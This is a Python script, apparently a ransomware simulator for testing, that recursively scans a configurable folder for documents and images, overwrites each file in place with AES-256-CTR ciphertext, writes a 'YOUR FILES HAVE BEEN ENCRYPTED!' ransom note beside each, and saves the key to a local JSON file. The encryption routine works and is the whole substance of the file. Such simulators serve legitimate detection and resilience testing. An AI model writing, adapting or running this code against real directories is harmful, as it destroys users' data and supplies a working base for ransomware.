import os
import json
import base64
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from dotenv import load_dotenv

load_dotenv()


DESTINATION_DIR = os.environ.get("WATCH_PATH", "nodes")
TEMP_DIR = os.environ.get("TEMP_DIR", "tmp")
os.makedirs(TEMP_DIR, exist_ok=True)


class RansomwareSimulator:
    def __init__(self, encryption_key=None):
        self.target_folder = DESTINATION_DIR
        self.key_path = os.path.join(TEMP_DIR, "decryption_key.json")
        # Generate 256-bit key (32 bytes) for AES-256
        self.key = encryption_key or os.urandom(32)
        self.encrypted_files = []

    def scan_files(self):
        """Scan for target files"""
        target_extensions = [".pdf", ".txt", ".docx", ".xlsx", ".jpg", ".png", ".json"]
        files = []

        if not os.path.exists(self.target_folder):
            print(f"Creating nodes directory: {self.target_folder}")
            os.makedirs(self.target_folder)
            return files

        for root, dirs, filenames in os.walk(self.target_folder):
            for filename in filenames:
                if any(filename.endswith(ext) for ext in target_extensions):
                    files.append(os.path.join(root, filename))

        return files

    def encrypt_file(self, file_path):
        "Encrypt a single file"
        try:
            with open(file_path, "rb") as f:
                original_data = f.read()

            # Generate random IV (16 bytes for AES block size)
            iv = os.urandom(16)

            # Create AES-256-CTR cipher
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CTR(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(original_data) + encryptor.finalize()

            # Write: IV (16 bytes) + ciphertext (raw binary for high entropy)
            encrypted_data = iv + ciphertext
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

            # Create ransom note
            ransom_note = """
YOUR FILES HAVE BEEN ENCRYPTED!
"""

            ransom_path = file_path + ".README_TO_DECRYPT.txt"
            with open(ransom_path, "w") as f:
                f.write(ransom_note)

            self.encrypted_files.append(file_path)
            print(f"Encrypted: {os.path.basename(file_path)}")

        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")

    def run_encryption(self):
        "Encrypt all found files"
        files = self.scan_files()

        if not files:
            print(f"No files found in {self.target_folder}")
            return

        print(f"Found {len(files)} files to encrypt")

        for file_path in files:
            self.encrypt_file(file_path)

        print(f"Encrypted {len(self.encrypted_files)} files")

    def save_key(self):
        "Save decryption key"
        key_data = {
            "decryption_key": base64.b64encode(self.key).decode(),
            "encrypted_files": self.encrypted_files,
            "timestamp": datetime.now().isoformat(),
        }

        with open(self.key_path, "w") as f:
            json.dump(key_data, f, indent=2)

        print(f"Decryption key saved to {self.key_path}")


def main():
    ransomware = RansomwareSimulator()
    ransomware.run_encryption()
    ransomware.save_key()


if __name__ == "__main__":
    main()
